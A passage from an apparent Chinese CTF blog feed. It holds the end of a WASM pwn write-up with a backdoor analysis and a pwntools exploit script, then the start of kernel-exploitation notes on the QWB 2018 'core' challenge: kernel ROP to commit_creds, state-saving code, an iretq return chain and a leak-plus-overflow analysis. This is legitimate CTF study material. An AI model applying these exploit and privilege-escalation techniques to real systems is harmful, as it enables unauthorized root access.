library/std/src/sys/unix/fs.rs:1119</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3  &lt;&amp;std::fs::File as std::io::Read&gt;::read_vectored () at library/std/src/fs.rs:810</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">4  0x0000555555b704e0 <span class="keyword">in</span> &lt;wasi_cap_std_sync::stdio::Stdin as wasi_common::file::WasiFile&gt;::read_vectored::&#123;&#123;closure&#125;&#125; () at library/core/src/str/pattern.rs:1796</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">5  0x0000555555b93eaf <span class="keyword">in</span> wasi_common::snapshots::preview_1::&lt;impl wasi_common::snapshots::preview_1::wasi_snapshot_preview1::WasiSnapshotPreview1 <span class="keyword">for</span> wasi_common::ctx::WasiCtx&gt;::fd_read::&#123;&#123;closure&#125;&#125; () at library/core/src/str/pattern.rs:1796</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">6  0x000055555583be3f <span class="keyword">in</span> &lt;tracing::instrument::Instrumented&lt;T&gt; as core::future::future::Future&gt;::poll () at library/core/src/str/pattern.rs:1796</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">7  0x00005555557e3db3 <span class="keyword">in</span> wiggle::run_in_dummy_executor () at library/core/src/str/pattern.rs:1796</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">8  0x0000555555859720 <span class="keyword">in</span> &lt;core::panic::unwind_safe::AssertUnwindSafe&lt;F&gt; as core::ops::<span class="keyword">function</span>::FnOnce&lt;()&gt;&gt;::call_once () at library/core/src/str/pattern.rs:1796</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">9  0x00005555558bcd04 <span class="keyword">in</span> wasmtime_runtime::instance::Instance::from_vmctx () at library/core/src/str/pattern.rs:1796</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">10 0x00005555558eede9 <span class="keyword">in</span> &lt;F as wasmtime::func::IntoFunc&lt;T,(wasmtime::func::Caller&lt;T&gt;,A1,A2,A3,A4),R&gt;&gt;::into_func::native_call_shim () at library/core/src/str/pattern.rs:1796</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">11 0x00007ffff7c0a70a <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">12 0x00007fffffffba30 <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">13 0x00007ffff7c01f75 <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">14 0x00007ffe77bb1000 <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">15 0x0000000000501c50 <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">16 0x0000000000000000 <span class="keyword">in</span> ?? ()</span></span><br></pre></td></tr></table></figure><p>函数调用栈十分复杂,当然顶上那一批都是wasmtime的调用api</p><p>我们主要关注wtoa映射的部分</p><p>一直<code>finish</code>到代码映射段,之后ni单步</p><p>以add函数为例</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-01-19_134822.png" alt=""></p><p>这是跳过wasmtime api之后的部分,之后不停的ni</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-01-19_134958.png" alt=""></p><p>可以看到在ni进入<code>0x7ffff7bff2f0</code>时,底下出现了字符串信息</p><p>那么大致便可以确定<code>0x7ffff7bff2f0-0x7ffff7bff000+0x1000=0x12f0</code>处便是add函数了</p><p>以此类推能得到其他函数的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">menu: 0x2120</span><br><span class="line">add: 0x12F0</span><br><span class="line">delete: 0x19C0</span><br><span class="line">edit: 0x15D0</span><br><span class="line">show: 0x1BA0</span><br><span class="line">exit: 0x2900</span><br></pre></td></tr></table></figure><p>确定完这些主要函数后便能够进入ida开始更多地静态分析了</p><p>不过在此之前还得先确定一些辅助函数</p><p>si进入以上任意一个函数中,继续使用以上的方法</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-01-19_135922.png" alt=""></p><p>可以判断出以下函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getinput: 0x3EF0</span><br><span class="line">output: 0x3DD0</span><br><span class="line">atoi: 0x2990</span><br></pre></td></tr></table></figure><h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><p>edit函数留有后门，可以直接修改node的结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v12 == <span class="number">0x345231</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(v5 + <span class="number">4016</span>) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = *(_DWORD *)(v5 + v4 + <span class="number">44</span>);</span><br><span class="line">    *(_DWORD *)(v5 + v4 + <span class="number">4</span>) = *(_DWORD *)(v5 + v4 + <span class="number">40</span>);</span><br><span class="line">    *(_DWORD *)(v5 + v4) = v14;</span><br><span class="line">    output(a1, a1, <span class="number">1246LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(v20 - <span class="number">96</span>));</span><br><span class="line">    wasm_0_::function_9_(</span><br><span class="line">      a1,</span><br><span class="line">      a1,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(v19 + <span class="number">40</span>)</span><br><span class="line">                   + *(_DWORD *)(v5</span><br><span class="line">                               + *(<span class="type">unsigned</span> <span class="type">int</span> *)(v5</span><br><span class="line">                                                 + (<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(v5 + *(<span class="type">unsigned</span> <span class="type">int</span> *)(v19 + <span class="number">92</span>) + <span class="number">4</span>)</span><br><span class="line">                                                                + <span class="number">4</span> * *(_DWORD *)(v5 + v4 + <span class="number">44</span>))))),</span><br><span class="line">      <span class="number">48LL</span>);</span><br><span class="line">    *(_DWORD *)(v5 + <span class="number">4016</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果length为0x345231的话可以进入一个特殊分支</p><p>这个分支依然有点难读,不过此时完全可以直接调试来判断后门的功能</p><p>最终<strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./launch.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;Choice &gt; &#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;size &gt; &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(content)).encode())</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27; &gt; &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, offset, length, content</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;Choice &gt; &#x27;</span>, <span class="string">b&#x27;E&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;index &gt; &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;offset &gt; &#x27;</span>, <span class="built_in">str</span>(offset).encode())</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;length &gt; &#x27;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27; &gt; &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index, offset, length</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;Choice &gt; &#x27;</span>, <span class="string">b&#x27;S&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;index &gt; &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;offset &gt; &#x27;</span>, <span class="built_in">str</span>(offset).encode())</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;length &gt; &#x27;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = remote(&#x27;47.100.169.26&#x27;, 20231)</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;AB&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;CD&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0x345231</span>, flat(&#123;<span class="number">0x20</span>:<span class="number">0x501b40</span>, <span class="number">0x28</span>:<span class="number">0x100</span>&#125;, filler=<span class="string">b&#x27;\0&#x27;</span>, length=<span class="number">0x30</span>))</span><br><span class="line">show(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">WASM</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="wasm" scheme="https://ixout.github.io/tags/wasm/"/>
    
    <category term="webpwn" scheme="https://ixout.github.io/tags/webpwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel学习笔记1</title>
    <link href="https://ixout.github.io/posts/13785/"/>
    <id>https://ixout.github.io/posts/13785/</id>
    <published>2023-12-28T08:25:43.000Z</published>
    <updated>2024-03-17T12:25:34.743Z</updated>
    
    <content type="html"><![CDATA[<h1 id="强网杯-2018-core"><a href="#强网杯-2018-core" class="headerlink" title="强网杯 2018 - core"></a>强网杯 2018 - core</h1><h2 id="Kernel-ROP"><a href="#Kernel-ROP" class="headerlink" title="Kernel ROP"></a>Kernel ROP</h2><p><strong>内核态的 ROP 与用户态的 ROP 一般无二，只不过利用的 gadget 变成了内核中的 gadget，所需要构造执行的 ropchain 由</strong> <code>system(&quot;/bin/sh&quot;)</code> <strong>变为了</strong> <code>commit_creds(&amp;init_cred)</code> 或 <code>commit_creds(prepare_kernel_cred(NULL))</code>，当我们成功地在内核中执行这样的代码后，当前线程的 cred 结构体便变为 init 进程的 cred 的拷贝，我们也就获得了 root 权限，此时在用户态起一个 shell 便能获得 root shell。</p><h3 id="状态保存"><a href="#状态保存" class="headerlink" title="状态保存"></a>状态保存</h3><p>通常情况下，我们的 exploit 需要进入到内核当中完成提权，而我们最终仍然需要<strong>着陆回用户态</strong>以获得一个 root 权限的 shell，因此在我们的 exploit 进入内核态之前我们需要<strong>手动模拟用户态进入内核态的准备工作</strong>——<strong>保存各寄存器的值到内核栈上</strong>，以便于后续着陆回用户态。</p><p>通常情况下使用如下函数保存各寄存器值到我们自己定义的变量中，以便于构造 rop 链：</p><blockquote><p>算是一个通用的 pwn 板子。</p><p>方便起见，使用了内联汇编，编译时需要指定参数：<code>-masm=intel</code>。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="返回用户态"><a href="#返回用户态" class="headerlink" title="返回用户态"></a>返回用户态</h3><p>由内核态返回用户态只需要：</p><ul><li><code>swapgs</code>指令恢复用户态 GS 寄存器</li><li><code>sysretq</code>或者<code>iretq</code>恢复到用户空间</li></ul><p>那么我们只需要在内核中找到相应的 gadget 并执行<code>swapgs;iretq</code>就可以成功着陆回用户态。</p><p>通常来说，我们应当构造如下 rop 链以返回用户态并获得一个 shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">↓   swapgs</span><br><span class="line">    iretq</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_eflags //64bit user_rflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure><h3 id="swapgs"><a href="#swapgs" class="headerlink" title="swapgs"></a>swapgs</h3><p>交换内核态与用户态的gs寄存器</p><h3 id="iretq-amp-amp-sysretq"><a href="#iretq-amp-amp-sysretq" class="headerlink" title="iretq&amp;&amp;sysretq"></a>iretq&amp;&amp;sysretq</h3><p>这两个指令都是用于返回用户态</p><p>其中iretq等效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rip</span><br><span class="line">pop cs</span><br><span class="line">pop rflags</span><br><span class="line">pop rsp</span><br><span class="line">pop ss</span><br></pre></td></tr></table></figure><p>sysretq则等效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rip</span><br></pre></td></tr></table></figure><h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><p>首先文件解压出来提供了四个文件,bzImage,core.cpio,start.sh和vmlinux</p><p>其中bzImage是压缩后的内核镜像,去除了大多数的调试符号</p><p>core.cpio是提供给内核的文件系统</p><p>start.sh是启动内核的脚本</p><p>vmlinux则是未经过压缩的静态链接的内核镜像,其中具有更多的调试符号,更利于调试,如果没有这个文件可以利用linus提供的<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a>脚本从bzImage中分离出来</p><p>观察以下start.sh启动脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">     │ File: ./start.sh</span><br><span class="line">───────┼────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ qemu-system-x86_64 \</span><br><span class="line">   2   │ -m 256M \</span><br><span class="line">   3   │ -kernel ./bzImage \#指定内核镜像</span><br><span class="line">   4   │ -initrd  ./core.cpio \#指定初始的根文件系统</span><br><span class="line">   5   │ -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">   6   │ -s  \#开启调试</span><br><span class="line">   7   │ -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">   8   │ -nographic  \#不使用图形化界面</span><br></pre></td></tr></table></figure><p><code>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</code></p><ul><li><code>quiet</code>: 禁用一些冗长的启动消息，以使启动过程更为静默。</li><li><code>kaslr</code>: 表示启用内核地址空间随机化</li></ul><p>解压core.cpio后看一下其中的init文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">───────┬─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: init</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ #!/bin/sh</span><br><span class="line">   2   │ mount -t proc proc /proc</span><br><span class="line">   3   │ mount -t sysfs sysfs /sys</span><br><span class="line">   4   │ mount -t devtmpfs none /dev</span><br><span class="line">   5   │ /sbin/mdev -s</span><br><span class="line">   6   │ mkdir -p /dev/pts</span><br><span class="line">   7   │ mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">   8   │ chmod 666 /dev/ptmx</span><br><span class="line">   9   │ cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">  10   │ echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">  11   │ echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">  12   │ ifconfig eth0 up</span><br><span class="line">  13   │ udhcpc -i eth0</span><br><span class="line">  14   │ ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">  15   │ route add default gw 10.0.2.2 </span><br><span class="line">  16   │ insmod /core.ko</span><br><span class="line">  17   │ </span><br><span class="line">  18   │ #poweroff -d 120 -f &amp;</span><br><span class="line">  19   │ setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">  20   │ echo &#x27;sh end!\n&#x27;</span><br><span class="line">  21   │ umount /proc</span><br><span class="line">  22   │ umount /sys</span><br><span class="line">  23   │ </span><br><span class="line">  24   │ #poweroff -d 0  -f</span><br></pre></td></tr></table></figure><ul><li><p><code>mount</code>命令用于挂载文件系统</p><ul><li><code>-t</code>选项指定挂载文件系统类型</li><li><code>-o</code>挂载选项</li></ul><p>例如<code>mount -vt devpts -o gid=4,mode=620 none /dev/pts</code>,将<code>devpts</code>文件系统挂载到<code>/dev/pts</code>目录,使用<code>none</code>作为源设备,即不需要源设备文件,挂载的目录的属性为<code>组别4,权限是620</code></p></li><li><p><code>/sbin/mdev</code>是一个轻量级的设备管理工具，通常用于嵌入式 Linux 系统中，用于在系统启动时自动创建和管理设备节点。</p><ul><li><code>-s</code>  ,用于启用 <code>mdev</code> 的守护进程（daemon）模式</li></ul><p>当运行 <code>/sbin/mdev -s</code> 时，<code>mdev</code> 将以守护进程的形式运行，并在后台监听设备的变化。</p></li><li><p><code>ifconfig eth0 up</code> 是一个 Linux 命令，用于启用(激活)网络接口</p></li><li><p><code>umount</code>与<code>mount</code>相反,卸载挂载的文件系统</p></li><li><p><code>setuidgid</code> 是一个busybox提供的一个工具，用于以指定的用户ID启动程序。</p></li><li><p><code>setsid</code>是一个 Unix/Linux 命令，用于启动一个新的会话。这个命令将当前进程设置为新会话的领头进程（session leader）。通常，<code>setsid</code> 用于创建一个与父进程和之前的会话完全脱离的新会话，这对于将进程变成守护进程很有用，因为它与原始终端会话无关。</p><p><code>setsid /bin/cttyhack setuidgid 1000 /bin/sh</code>作用是创建一个新的会话，执行 <code>/bin/cttyhack</code> 工具，然后以用户 ID 1000 的身份启动 <code>/bin/sh</code> shell</p></li><li><p><code>insomod</code>的作用是加载驱动模块,加载后的驱动模块会出现在<code>/sys/module/</code>中</p></li></ul><p>init中比较重要的几点是</p><ul><li>第 9 行中把 <code>kallsyms</code> 的内容保存到了 <code>/tmp/kallsyms</code> 中，那么我们就能从 <code>/tmp/kallsyms</code> 中读取 <code>commit_creds</code>，<code>prepare_kernel_cred</code> 的函数的地址了</li><li>第 10 行把 <code>kptr_restrict</code> 设为 1，这样就不能通过 <code>/proc/kallsyms</code> 查看函数地址了，但第 9 行已经把其中的信息保存到了一个可读的文件中，这句就无关紧要了</li><li>第 11 行把 <code>dmesg_restrict</code> 设为 1，这样就不能通过 <code>dmesg</code> 查看 kernel 的信息了</li></ul><h2 id="模块分析"><a href="#模块分析" class="headerlink" title="模块分析"></a>模块分析</h2><p>检查一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/core/core/core.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><p>存在canary,ida进一步静态分析</p><p>存在七个主要函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">core_release.text<span class="number">0000000000000000</span><span class="number">00000011</span><span class="number">00000000</span></span><br><span class="line">core_write.text<span class="number">0000000000000011</span><span class="number">00000052</span><span class="number">00000010</span></span><br><span class="line">core_read.text<span class="number">0000000000000063</span><span class="number">00000093</span><span class="number">00000050</span></span><br><span class="line">core_copy_func.text<span class="number">00000000000000F</span>6<span class="number">00000069</span><span class="number">00000050</span></span><br><span class="line">core_ioctl.text<span class="number">000000000000015F</span><span class="number">0000005</span>A<span class="number">00000008</span></span><br><span class="line">init_module.init.text<span class="number">00000000000001B</span>9<span class="number">00000032</span><span class="number">00000000</span></span><br><span class="line">exit_core.<span class="built_in">exit</span>.text<span class="number">00000000000001</span>EB<span class="number">00000019</span><span class="number">00000000</span></span><br></pre></td></tr></table></figure><p><strong>init_module()</strong> 注册了 <code>/proc/core</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: created /proc/core entry\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exit_core()</strong> 删除 <code>/proc/core</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">exit_core</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( core_proc )</span><br><span class="line">    result = remove_proc_entry(<span class="string">&quot;core&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>core_ioctl()</strong> 定义了三条命令，分别调用 <strong>core_read()</strong>，<strong>core_copy_func()</strong> 和设置全局变量 <strong>off</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109787</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109788</span>:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = a3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109786</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>core_read()</strong> 从 <code>v4[off]</code> 拷贝 64 个字节到用户空间，但要注意的是全局变量 <code>off</code> 使我们能够控制的，因此可以合理的控制 <code>off</code> 来 leak canary 和一些地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v5 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_read\n&quot;</span>);</span><br><span class="line">  printk(<span class="string">&quot;\x016%d %p\n&quot;</span>);</span><br><span class="line">  v2 = v4;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_to_user(v1, &amp;v4[off], <span class="number">64LL</span>) )</span><br><span class="line">    __asm &#123; swapgs &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>core_copy_func()</strong> 从全局变量 <code>name</code> 中拷贝数据到局部变量中，长度是由我们指定的，当要注意的是 qmemcpy 用的是 <code>unsigned __int16</code>，但传递的长度是 <code>signed __int64</code>，因此如果控制传入的长度为 <code>0xffffffffffff0000|(0x100)</code> 等值，就可以栈溢出了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 